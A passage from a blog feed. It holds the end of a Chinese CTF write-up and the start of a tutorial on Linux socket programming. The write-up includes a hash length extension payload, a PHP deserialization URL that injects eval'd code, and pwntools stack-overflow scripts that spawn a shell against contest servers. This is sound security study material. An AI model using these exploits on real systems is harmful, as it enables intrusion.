setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;&lt;source_code&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashpump</span><br><span class="line">Input Signature: c3ef608fdc59d9143c39664ade7556d5</span><br><span class="line">Input Data: D0g3</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: test</span><br><span class="line">5e38fe415ce2786f4ae79776038f53ee</span><br><span class="line">D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00test</span><br></pre></td></tr></table></figure><p>将\x改为%，将POST的username改为D0g3，password改为<code>D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test</code>，cookie加入getflag: 5e38fe415ce2786f4ae79776038f53ee</p><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;h4sh_1s_s0_diffic1ut_t0_me&#125;</span><br></pre></td></tr></table></figure><h3 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h3><p><a href="http://222.18.158.227:10380/index.php" target="_blank" rel="external">http://222.18.158.227:10380/index.php</a><br>又是买彩票。和之前的qctf一样。也是php弱类型的锅。<br>POST传入{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}<br>每次都能中$5000000，多买几次就能买flag了。<br>Here is your flag: 想上飞船不仅仅是有钱就够了，你还得有智慧，解出这道题，你就可以获救了：一次RSA密钥对生成中，假设p=473398606，q=451141，e=17 求解出d</p><p>python 已知p,q,e求rsa的d<br><a href="https://blog.csdn.net/zyxyzz/article/details/78205321" target="_blank" rel="external">https://blog.csdn.net/zyxyzz/article/details/78205321</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># coding = utf-8</span><br><span class="line">def computeD(fn, e):</span><br><span class="line">    (x, y, r) = extendedGCD(fn, e)</span><br><span class="line">    #y maybe &lt; 0, so convert it</span><br><span class="line">    if y &lt; 0:</span><br><span class="line">        return fn + y</span><br><span class="line">    return y</span><br><span class="line">def extendedGCD(a, b):</span><br><span class="line">    #a*xi + b*yi = ri</span><br><span class="line">    if b == 0:</span><br><span class="line">        return (1, 0, a)</span><br><span class="line">    #a*x1 + b*y1 = a</span><br><span class="line">    x1 = 1</span><br><span class="line">    y1 = 0</span><br><span class="line">    #a*x2 + b*y2 = b</span><br><span class="line">    x2 = 0</span><br><span class="line">    y2 = 1</span><br><span class="line">    while b != 0:</span><br><span class="line">        q = a / b</span><br><span class="line">        #ri = r(i-2) % r(i-1)</span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        #xi = x(i-2) - q*x(i-1)</span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        #yi = y(i-2) - q*y(i-1)</span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    return(x1, y1, a)</span><br><span class="line">p = 473398606</span><br><span class="line">q = 451141</span><br><span class="line">e = 17</span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - 1) * (q - 1)</span><br><span class="line">d = computeD(fn, e)</span><br><span class="line">print d</span><br></pre></td></tr></table></figure></p><p>求得150754621171553<br>D0g3{150754621171553}</p><h3 id="Double-S"><a href="#Double-S" class="headerlink" title="Double-S"></a>Double-S</h3><p>签道题<br><a href="http://54.200.169.99:7000/" target="_blank" rel="external">http://54.200.169.99:7000/</a><br>源码泄露<a href="http://54.200.169.99:7000/www.zip代码审计" target="_blank" rel="external">http://54.200.169.99:7000/www.zip代码审计</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;info = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;aa&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(unserialize($_GET[&apos;aa&apos;])==&apos;phpinfo&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">    $m = new Anti();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    header(&quot;location:index.html&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><a href="http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}" target="_blank" rel="external">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}</a><br>通过phpinfo页面，我们知道php.ini中默认<code>session.serialize_handler</code>为<code>php_serialize</code>，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p><p>由phpinfo()页面继续可知，<code>session.upload_progress.enabled</code>为On。</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>传入$_SESSION数据的，这里就利用到了反序列化问题。<br>考虑序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info=&apos;print_r(scandir(dirname(__FILE__)));&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new Anti();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br><span class="line">O:4:&quot;Anti&quot;:1:&#123;s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p><a href="http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}" target="_blank" rel="external">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</a><br>发现flag文件<a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a><br>D0g3{Sim_Pl3_S3sSi0n}</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="neko"><a href="#neko" class="headerlink" title="neko"></a>neko</h3><p>也是一个栈溢出，有system地址，leak libcbalabalabala。。。。去libcdb查版本，常规操作没啥说的贴个脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">EXE = <span class="string">"./neko"</span></span><br><span class="line">e = ELF(EXE)</span><br><span class="line">libc = e.libc</span><br><span class="line">io = remote(<span class="string">'149.248.7.48'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">system = e.plt[<span class="string">"system"</span>]</span><br><span class="line">puts = e.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = e.got[<span class="string">"puts"</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"cats?\n"</span>,<span class="string">'y'</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0xd4</span></span><br><span class="line">payload += p32(puts)</span><br><span class="line">payload += p32(<span class="number">0x080486E7</span>)</span><br><span class="line">payload += p32(puts_got)</span><br><span class="line">io.sendafter(<span class="string">"anchovies:\n"</span>,payload)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">base = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x05f140</span></span><br><span class="line">binsh = base + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0xd4</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(binsh) * <span class="number">2</span></span><br><span class="line">io.sendafter(<span class="string">"anchovies:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>flag: D0g3{Wh0_Doe5n’t_1ik3_k1tt3ns??}</p><h3 id="hiahia"><a href="#hiahia" class="headerlink" title="hiahia"></a>hiahia</h3><p>入门pwn，栈溢出到arg[0]<br>check一下，有NX和canary这是利用前提<br><img src="/2018/11/26/安洵杯writewp/sec.PNG" alt="Alt text"><br>调试一下找到flag和arg[0]的地址算一下偏移直接溢出<br><img src="/2018/11/26/安洵杯writewp/home.PNG" alt="Alt text"><br><img src="/2018/11/26/安洵杯writewp/ctf.PNG" alt="Alt text"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">old_flag_addr = <span class="number">0x4007a8</span></span><br><span class="line">new_flag_addr = <span class="number">0x6007a8</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'149.248.7.48'</span>, <span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please find the flag!"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#payload = "a"*0x218 + p64(new_flag_addr)</span></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">360</span> + p64(old_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag:D0g3{ccc_y0u_again_hiahiahia_}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h3 id=&quot;CRC&quot;&gt;&lt;a href=&quot;#CRC&quot; class=&quot;headerlink&quot; title=&quot;CRC&quot;&gt;&lt;/a&gt;CR
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Linux网络编程基础</title>
    <link href="https://www.twosmi1e.com/2018/11/20/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.twosmi1e.com/2018/11/20/Linux网络编程基础/</id>
    <published>2018-11-20T12:21:30.000Z</published>
    <updated>2018-11-20T12:22:32.465Z</updated>
    
    <content type="html"><![CDATA[<h2 id="套接字编程"><a href="#套接字编程" class="headerlink" title="套接字编程"></a>套接字编程</h2><p> 套接字是一种网络API，用来开发网络程序。套接字接口提供一种进程间通信的方法，使得在相同或不同的主机上的进程能以相同的规范进行双向信息传送。</p><h3 id="套接字类型"><a href="#套接字类型" class="headerlink" title="套接字类型"></a>套接字类型</h3><p>常用协议：</p><ul><li><code>INET</code> ipv4</li><li><code>INET6</code> ipv6<br>类型：</li><li><code>SOCK_STREAM</code> ：提供面向连接、可靠的数据传输服务。TCP协议支持。</li><li><code>SOCK_DGRAM</code> ：提供面向无连接的服务。UDP协议支持。</li><li><code>SOCK_RAW</code>：原始套接字，常用于检测新的协议。<h3 id="套接字地址结构"><a href="#套接字地址结构" class="headerlink" title="套接字地址结构"></a>套接字地址结构</h3>套接字地址结构定义在头文件<code>&lt;netinet/in.h&gt;</code>中<h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> <span class="keyword">in_addr_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> <span class="keyword">in_port_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">sa_family_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">in_addr_t</span> s_addr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span>sin_len;<span class="comment">//套接字地址结构长度</span></span><br><span class="line"><span class="keyword">sa_family_t</span> sin_family;<span class="comment">//Internet地址族</span></span><br><span class="line"><span class="keyword">in_port_t</span> sin_port;<span class="comment">//端口号</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span><span class="comment">//结构体 成员存储IP地址</span></span><br><span class="line"><span class="keyword">char</span> sin_zero[<span class="number">8</span>];<span class="comment">//暂未使用，置0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h4 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> <span class="keyword">in_port_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">sa_family_t</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span> s6_addr[<span class="number">16</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span>sin6_len;<span class="comment">//套接字地址结构长度</span></span><br><span class="line"><span class="keyword">sa_family_t</span> sin6_family;<span class="comment">//Internet地址族</span></span><br><span class="line"><span class="keyword">in_port_t</span> sin6_port;<span class="comment">//端口号</span></span><br><span class="line"><span class="keyword">uint32_t</span> sin6_flowinfo; <span class="comment">//低24位流量标号，下4位优先级，再下4位保留</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span><span class="comment">//结构体 成员存储IP地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/20/Linux网络编程基础/1541072357804.png" alt="地址结构比较"></p><h3 id="通用套接字地址结构"><a href="#通用套接字地址结构" class="headerlink" title="通用套接字地址结构"></a>通用套接字地址结构</h3><p>定义在头文件<code>&lt;sys/socket.h&gt;</code>中<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">sockaddr</span>&#123;</span></span><br><span class="line">   <span class="keyword">uint8_t</span>    sa_len;</span><br><span class="line">   <span class="keyword">sa_family_t</span>  sa_family;</span><br><span class="line">   <span class="keyword">char</span>  sa_data[<span class="number">14</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h3><h4 id="字节排序函数"><a href="#字节排序函数" class="headerlink" title="字节排序函数"></a>字节排序函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint16_t</span>  htons(<span class="keyword">uint16_t</span> hostshort)</span><br><span class="line"><span class="keyword">uint32_t</span>  htonl(<span class="keyword">uint32_t</span> hostlong)</span><br><span class="line"><span class="comment">//均返回：网络字节序值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint16_t</span>  ntohs(<span class="keyword">uint16_t</span> netshort)</span><br><span class="line"><span class="keyword">uint32_t</span>  ntohl(<span class="keyword">uint32_t</span> netlong)</span><br><span class="line"><span class="comment">//均返回：主机字节序值</span></span><br></pre></td></tr></table></figure><p>h:主机  n:网络  s:短整数   l:长整数</p><h4 id="字节操纵函数"><a href="#字节操纵函数" class="headerlink" title="字节操纵函数"></a>字节操纵函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*BSD*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bzero</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bcopy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">void</span> *dest, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">bcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">void</span> *dest, <span class="keyword">size_t</span> nbytes)</span></span>; <span class="comment">/*返回0则相同，非0不相同*/</span></span><br></pre></td></tr></table></figure><p>bzero置0，bcopy拷贝，bcmp比较。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ANSI C*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">int</span> c, <span class="keyword">size_t</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>   <span class="title">memcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *ptr1, <span class="keyword">const</span> <span class="keyword">void</span> *ptr2, <span class="keyword">size_t</span> nbytes)</span></span></span><br></pre></td></tr></table></figure></p><h4 id="IP地址转换函数"><a href="#IP地址转换函数" class="headerlink" title="IP地址转换函数"></a>IP地址转换函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line">        将点分十进制数串转换成<span class="number">32</span>位网络字节序二进制值。</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_aton</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp, struct in_addr *inp)</span></span>;</span><br><span class="line">                                        返回：<span class="number">1</span>-串有效，<span class="number">0</span>-串有错</span><br><span class="line"><span class="keyword">in_addr_t</span> inet_addr(<span class="keyword">const</span> <span class="keyword">char</span> *cp);</span><br><span class="line">返回：若成功，返回<span class="number">32</span>位二进制的网络字节序地址，若有错，则返回一个常值</span><br></pre></td></tr></table></figure><p><code>inet_aton</code>函数将cp所指的字符串(点分十进制数串，如192.168.0.1)转换成32位的网络字节序二进制，并通过指针inp来存储。这个函数需要对字符串所指的地址进行有效性验证。但如果cp为空，函数仍然成功，但不存储任何结果。<br><code>inet_addr</code>进行相同的转换，但不进行有效性验证，也就是说，所有232种可能的二进制值对<code>inet_addr</code>函数都是有效的。<br><code>inet_ntoa</code>函数将32位的网络字节序二进制IPv4地址转换成相应的点分十进制数串。但由于返回值所指向的串留在静态内存中，这意味着函数是不可重入的。</p><p><strong>上述三个地址转换函数都只能处理IPv4协议，而不能处理IPv6地址。</strong></p><h4 id="inet-pton的实现（只支持ipv4）"><a href="#inet-pton的实现（只支持ipv4）" class="headerlink" title="inet_pton的实现（只支持ipv4）"></a>inet_pton的实现（只支持ipv4）</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">const</span> <span class="keyword">char</span> *strptr, <span class="keyword">void</span> *addrptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (family == AF_INET) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>  <span class="title">in_val</span>;</span></span><br><span class="line">            <span class="keyword">if</span> (inet_aton(strptr, &amp;in_val)) &#123;</span><br><span class="line">                    <span class="built_in">memcpy</span>(addrptr, &amp;in_val, <span class="keyword">sizeof</span>(struct in_addr));</span><br><span class="line">                    <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">                errno = EAFNOSUPPORT; <span class="comment">/*以不被支持的地址族做为family的参数*/</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TCP套接字编程"><a href="#TCP套接字编程" class="headerlink" title="TCP套接字编程"></a>TCP套接字编程</h3><p><img src="/2018/11/20/Linux网络编程基础/1541514913880.png" alt="Alt text"></p><h4 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h4><ol><li>创建套接字</li><li>绑定套接字</li><li>设置套接字为监听模式，进入被动接受连接状态</li><li>接受请求，建立连接</li><li>读写数据</li><li>终止连接<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4></li><li>创建套接字</li><li>与服务器建立连接</li><li>读写数据</li><li>终止连接</li></ol><h4 id="TCP服务器模板"><a href="#TCP服务器模板" class="headerlink" title="TCP服务器模板"></a>TCP服务器模板</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sockfd,connect_sock;</span><br><span class="line"><span class="keyword">if</span>((sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)   &#123;</span><br><span class="line"></span><br><span class="line">perror(“create socket failed.”);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bind sockfd to some address */</span></span><br><span class="line"><span class="comment">/* listen */</span></span><br><span class="line">……</span><br><span class="line">loop  &#123;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span>((connect_sock=accept(sockfd,<span class="literal">NULL</span>,<span class="literal">NULL</span>))==<span class="number">-1</span>)  &#123;</span><br><span class="line">perror(“Accept error.”);</span><br><span class="line">                            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">                 <span class="comment">/* read and process request */</span></span><br><span class="line">close(connect_sock);</span><br><span class="line">       &#125;</span><br><span class="line">close(sockfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TCP客户端模板"><a href="#TCP客户端模板" class="headerlink" title="TCP客户端模板"></a>TCP客户端模板</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 